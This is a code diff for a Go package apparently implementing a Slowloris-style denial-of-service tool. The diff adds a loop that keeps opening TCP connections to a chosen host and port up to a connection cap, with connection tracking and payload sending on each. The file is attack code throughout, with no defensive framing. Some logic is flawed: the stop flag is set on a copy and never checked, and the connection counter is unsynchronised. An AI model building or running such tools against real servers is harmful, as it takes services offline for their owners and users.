@@ -1,20 +1,70 @@
 package loris
 
 import (
-	log "github.com/sirupsen/logrus"
+	"fmt"
 	"net"
+	"time"
+
+	log "github.com/sirupsen/logrus"
 )
 
 type defaultLoris struct {
-	SStrat SendStrategy
+	SStrat      SendStrategy
+	MaxConns    int
+	connections int
+	done        bool
 }
 
 func (l defaultLoris) Execute(conn net.Conn, prefix []byte, size int) chan bool {
-	logger.WithFields(log.Fields{
-		"prefix":   string(prefix),
-		"dataSize": size,
-	}).Info("Sending payload")
+	return l.executeOnConnection(conn, prefix, size)
+}
 
+func (l defaultLoris) ExecuteContinuous(host string, port int, prefix []byte, size int) {
+	target := fmt.Sprintf("%s:%d", host, port)
+
+	go l.track()
+
+	for {
+		// TODO make configurable
+		<-time.After(100 * time.Millisecond)
+
+		if l.connections >= l.MaxConns {
+			continue
+		}
+
+		logger.WithFields(log.Fields{
+			"target": target,
+		}).Trace("Establishing connection")
+		conn, err := net.Dial("tcp", target)
+		if err != nil {
+			logger.WithFields(log.Fields{
+				"target": target,
+			}).Warn("Failed to establish connection")
+		} else {
+			logger.WithFields(log.Fields{
+				"target": target,
+				"local":  conn.LocalAddr().String(),
+			}).Debug("Established connection")
+
+			go func() {
+				<-l.executeOnConnection(conn, prefix, size)
+			}()
+		}
+	}
+}
+
+func (l defaultLoris) Stop() {
+	l.done = true
+}
+
+func (l *defaultLoris) track() {
+	for {
+		time.Sleep(5 * time.Second)
+		logger.Infof("Managing %d connections", l.connections)
+	}
+}
+
+func (l *defaultLoris) executeOnConnection(conn net.Conn, prefix []byte, size int) chan bool {
 	closed := make(chan bool)
 
 	go l.send(conn, prefix, size, closed)
@@ -22,11 +72,17 @@ func (l defaultLoris) Execute(conn net.Conn, prefix []byte, size int) chan bool 
 	return closed
 }
 
-func (l defaultLoris) send(conn net.Conn, prefix []byte, size int, closed chan bool) {
-	defer func() { closed <- true }()
+func (l *defaultLoris) send(conn net.Conn, prefix []byte, size int, closed chan bool) {
+	l.connections++
+
+	defer func() {
+		conn.Close()
+		closed <- true
+		l.connections--
+	}()
 
 	received := make(chan bool)
-	go l.monitor(conn, received)
+	go l.monitorConnection(conn, received)
 
 	sendIndex := 0
 	length := len(prefix) + size
@@ -66,8 +122,8 @@ func (l defaultLoris) send(conn net.Conn, prefix []byte, size int, closed chan b
 	logger.Debug("Payload sent")
 }
 
-func (l defaultLoris) monitor(conn net.Conn, closed chan<- bool) {
-	defer func() { closed <- true }()
+func (l defaultLoris) monitorConnection(conn net.Conn, done chan<- bool) {
+	defer func() { done <- true }()
 
 	read := make([]byte, 1)
 	_, err := conn.Read(read)
@@ -76,11 +132,11 @@ func (l defaultLoris) monitor(conn net.Conn, closed chan<- bool) {
 			"error":  err,
 			"remote": conn.RemoteAddr().String(),
 			"local":  conn.LocalAddr().String(),
-		}).Error("Error while monitoring connection")
+		}).Debug("Error while monitoring connection")
 	} else {
 		logger.WithFields(log.Fields{
 			"remote": conn.RemoteAddr().String(),
 			"local":  conn.LocalAddr().String(),
-		}).Warn("Received data while monitoring connection")
+		}).Debug("Received data while monitoring connection")
 	}
 }
